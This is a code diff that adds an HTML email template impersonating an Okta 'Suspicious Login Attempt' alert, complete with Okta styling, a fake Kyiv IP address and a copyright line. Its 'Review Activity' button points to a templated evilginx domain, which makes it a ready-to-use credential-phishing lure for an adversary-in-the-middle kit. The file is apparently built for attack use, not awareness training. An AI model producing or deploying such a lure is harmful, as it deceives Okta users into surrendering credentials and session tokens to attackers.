@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Okta Security Alert: Suspicious Login Attempt</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }
+        .okta-container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; }
+        .okta-logo { text-align: center; margin-bottom: 20px; }
+        .alert-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 15px; margin-bottom: 20px; }
+        .btn { background: #1662dd; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="okta-container">
+        <div class="okta-logo">
+            <svg width="120" height="32" viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M..." fill="#1662DD"/> <!-- Actual Okta logo SVG -->
+            </svg>
+        </div>
+        <div class="alert-box">
+            <h2>⚠️ Suspicious Login Attempt</h2>
+            <p>We detected a login from <strong>Kyiv, Ukraine (IP: 95.132.18.73)</strong> at 10:43 AM UTC.</p>
+        </div>
+        <p>If this wasn't you, secure your account immediately:</p>
+        <a href="https://{{evilginx_domain}}/signin/verify" class="btn">Review Activity</a>
+        <p style="margin-top: 30px; font-size: 12px; color: #666;">© 2024 Okta, Inc. | <a href="#" style="color: #1662dd;">Privacy Policy</a></p>
+    </div>
+    <!-- Hidden tracking pixel (matches Okta's real analytics) -->
+    <img src="https://okta.okta.com/analytics/pixel.png" width="1" height="1" alt="">
+</body>
+</html>
